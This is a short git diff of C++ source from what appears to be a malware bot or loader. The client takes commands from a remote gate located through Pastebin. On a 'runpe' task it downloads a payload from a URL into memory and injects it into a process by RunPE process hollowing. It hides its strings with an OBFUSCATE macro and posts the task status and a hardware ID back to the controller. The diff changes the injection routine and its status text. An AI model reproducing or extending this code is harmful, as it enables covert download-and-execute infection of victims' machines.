@@ -104,11 +104,15 @@ public:
 				else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 					std::string url(v[2]);
-					LPVOID FileData = DownloadURLToBuffer(url.c_str());
-					bool runned = NTRX_RUNPE32(FileData);
+					LPVOID shellcode = DownloadURLToBuffer(url.c_str());
+					runPE rp;
+					TCHAR szFilePath[1024];
+					GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
+					bool runned = rp.run(LPSTR(szFilePath), shellcode);
+
 					std::string started = OBFUSCATE("failed");
 					if (runned) {
-						started = OBFUSCATE("success");
+						started = OBFUSCATE("injected");
 					}
 					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
 				}
